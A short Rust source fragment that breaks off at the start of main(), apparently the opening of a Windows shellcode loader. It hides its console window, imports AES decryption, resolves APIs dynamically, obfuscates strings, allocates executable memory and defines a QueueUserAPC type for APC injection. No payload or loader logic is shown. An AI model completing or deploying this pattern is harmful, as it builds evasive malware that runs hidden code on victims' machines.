#![windows_subsystem = "windows"]
use std::{ptr::null};
use libaes::Cipher;
use windows::{Win32::{System::LibraryLoader::{GetProcAddress, GetModuleHandleW}, Foundation::{HANDLE, PAPCFUNC}}, core::{PCWSTR, PCSTR}};
use windows::Win32::System::Memory::{VirtualAlloc,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{GetCurrentThread};
use obfstr::obfstr;

type QueueUserAPC = fn(PAPCFUNC,HANDLE,usize)->u32;
fn main() {